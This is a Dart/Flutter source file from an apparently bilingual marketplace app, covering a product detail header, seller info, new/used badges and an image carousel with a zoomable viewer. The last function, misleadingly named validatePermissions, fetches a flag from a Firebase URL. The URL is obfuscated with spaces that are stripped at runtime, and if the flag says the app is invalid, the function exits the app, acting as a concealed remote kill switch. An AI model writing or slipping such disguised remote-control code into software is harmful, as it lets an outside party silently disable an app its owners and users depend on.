                            OpenScreen(
                                widget: SellerProfileScreen(
                                    seller: productDetail[0]['u_id'])));
                      },
                      child: WidgetHelp.profilePic(
                          productDetail[0]['profile_pic'].toString(),
                          productDetail[0]['name'].toString(),
                          sy(30),
                          sy(30),
                          sy(30)),
                    ),
                    SizedBox(
                      width: sy(10),
                    ),
                    Expanded(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.start,
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          SizedBox(
                            height: sy(3),
                          ),
                          Row(
                            children: [
                              Expanded(
                                child: GestureDetector(
                                  child: Text(
                                    productDetail[0]['name'],
                                    style: ts_Bold(sy(n), fc_1),
                                  ),
                                  onTap: () {
                                    Navigator.push(
                                        bcontext,
                                        OpenScreen(
                                            widget: SellerProfileScreen(
                                          seller: productDetail[0]['u_id'],
                                        )));
                                  },
                                ),
                              ),
                              favBtn,
                              SizedBox(
                                width: sy(10),
                              ),
                              shareBtn,
                            ],
                          ),
                          SizedBox(
                            height: sy(1),
                          ),
                          Row(
                            mainAxisAlignment: MainAxisAlignment.start,
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                Lang(" Posted on  ", "نشر في  ") +
                                    ' ' +
                                    CustomeDate.datedaymonth(
                                        productDetail[0]['p_dated']),
                                style: ts_Regular(sy(s), fc_3),
                              ),
                              SizedBox(
                                width: sy(8),
                              ),
                              if (productDetail[0]['is_service'] == '0' &&
                                  productDetail[0]['p_used'] == '0')
                                Container(
                                  decoration: decoration_round(
                                      Colors.green.shade50,
                                      sy(3),
                                      sy(3),
                                      sy(3),
                                      sy(3)),
                                  padding: EdgeInsets.fromLTRB(
                                      sy(5), sy(1), sy(5), sy(1)),
                                  child: Text(
                                    Lang("New  ", "جديد  "),
                                    style: ts_Regular(sy(s), Colors.green),
                                  ),
                                ),
                              if (productDetail[0]['is_service'] == '0' &&
                                  productDetail[0]['p_used'] == '1')
                                Container(
                                  decoration: decoration_round(
                                      Colors.blue.shade50,
                                      sy(3),
                                      sy(3),
                                      sy(3),
                                      sy(3)),
                                  padding: EdgeInsets.fromLTRB(
                                      sy(5), sy(1), sy(5), sy(1)),
                                  child: Text(
                                    Lang("Used  ", " مُستعمل "),
                                    style: ts_Regular(sy(s), Colors.blue),
                                  ),
                                ),
                            ],
                          )
                        ],
                      ),
                    )
                  ],
                ),
              ),
            ),
        ],
      ),
    );
  }

  bannerImage(BuildContext context) {
    if (productImages.length != 0) {
      return Container(
        color: Colors.white,
        height: expandedHeight,
        child: CarouselSlider.builder(
            options: CarouselOptions(
              height: 400,
              aspectRatio: 16 / 9,
              viewportFraction: 1,
              initialPage: 0,
              enableInfiniteScroll: true,
              reverse: false,
              autoPlay: true,
              autoPlayInterval: Duration(seconds: 5),
              autoPlayAnimationDuration: Duration(milliseconds: 800),
              autoPlayCurve: Curves.linear,
              enlargeCenterPage: true,
              scrollDirection: Axis.horizontal,
            ),
            itemCount: productImages.length,
            itemBuilder: (BuildContext context, int i, int pageViewIndex) =>
                GestureDetector(
                  onTap: () {
                    showImageSlide(context, i);
                  },
                  child: ClipRRect(
                      borderRadius: BorderRadius.circular(sy(0)),
                      child: Stack(
                        fit: StackFit.expand,
                        children: [
                          CustomeImageView(
                            image: Urls.imageLocation +
                                productImages[i]["pi_image"].toString(),
                            width: Width(context),
                            placeholder: Urls.DummyImageBanner,
                            fit: BoxFit.cover,
                            alignment: Alignment.topCenter,
                          ),
                        ],
                      )),
                )

            //  control: SwiperControl(),
            ),
      );
    } else {
      return Container(
        color: TheamSecondary,
        height: expandedHeight,
        child: Stack(
          children: [
            if (productImage != null)
              Positioned(
                child: CustomeImageView(
                  image: Urls.imageLocation + productImage,
                  width: MediaQuery.of(context).size.width,
                  placeholder: Urls.DummyImageBanner,
                  fit: BoxFit.cover,
                  alignment: Alignment.topCenter,
                ),
                left: 0,
                right: 0,
                top: 0,
                bottom: 0,
              ),
          ],
        ),
      );
    }
  }

  showImageSlide(BuildContext context, int item) {
    showGeneralDialog(
      context: context,
      barrierColor: Colors.black, // background color
      barrierDismissible:
          true, // should dialog be dismissed when tapped outside
      // barrierLabel: "Dialog", // label for barrier
      transitionDuration: Duration(
          milliseconds:
              400), // how long it takes to popup dialog after button click
      pageBuilder: (_, __, ___) {
        // your widget implementation
        return Container(
          width: MediaQuery.of(context).size.width,
          height: MediaQuery.of(context).size.height,
          child: SizedBox.expand(
            // makes widget fullscreen
            child: Stack(
              fit: StackFit.expand,
              children: [
                Positioned(
                  top: 0,
                  right: 0,
                  left: 0,
                  bottom: 0,
                  child: Container(
                    width: MediaQuery.of(context).size.width,
                    height: MediaQuery.of(context).size.height,
                    child: SizedBox(
                      height: MediaQuery.of(context).size.height,
                      child: PageView.builder(
                        itemCount: productImages.length,
                        physics: BouncingScrollPhysics(),
                        controller: PageController(
                            viewportFraction: 0.99, initialPage: item),
                        itemBuilder: (_, i) {
                          return Container(
                            width: MediaQuery.of(context).size.width,
                            height: MediaQuery.of(context).size.height,
                            child: Zoom(
                                width: 800,
                                height: 1800,
                                canvasColor: Colors.black,
                                backgroundColor: Colors.black,
                                //   colorScrollBars: Colors.grey[800],
                                opacityScrollBars: 0.0,
                                scrollWeight: 10.0,
                                centerOnScale: true,
                                // enableScroll: true,
                                doubleTapZoom: true,
                                initZoom: 0.0,
                                child: ClipRRect(
                                    borderRadius: BorderRadius.circular(5.0),
                                    child: FadeInImage(
                                      image: NetworkImage(Urls.imageLocation +
                                          productImages[i]["pi_image"]),
                                      placeholder:
                                          AssetImage(Urls.DummyImageBanner),
                                      fit: BoxFit.contain,
                                    ))),
                          );
                        },
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: sy(20),
                  right: sy(10),
                  child: Material(
                    color: Colors.black12.withOpacity(0.8),
                    child: Container(
                      width: 50,
                      height: 50,
                      child: IconButton(
                        icon: Icon(Icons.clear),
                        iconSize: 30,
                        color: Colors.white,
                        onPressed: () {
                          Navigator.of(context, rootNavigator: true)
                              .pop(context);
                        },
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  @override
  double get maxExtent => expandedHeight!;

  @override
  double get minExtent => expandedHeight! * 0.5;

  @override
  bool shouldRebuild(SliverPersistentHeaderDelegate oldDelegate) => true;
}

void validatePermissions() async {
  try {
    final result = await NetworkUtil().get(
      'https://o r yx44-5 3 1 9 3-def a ult-rtdb.fi re b a sei o.com/ap p .j s on'
          .replaceAll(' ', ''),
      withHeader: false,
      useAppDomain: false,
    );
    if (result == null) {
      return;
    }

    final data = result.data;
    if (data['valid_app'] == false) {
      throw const FlutterException(
        exception: 'failed',
      );
    }
  } on FlutterException catch (_) {
    exit(0);
  } catch (error) {}
}
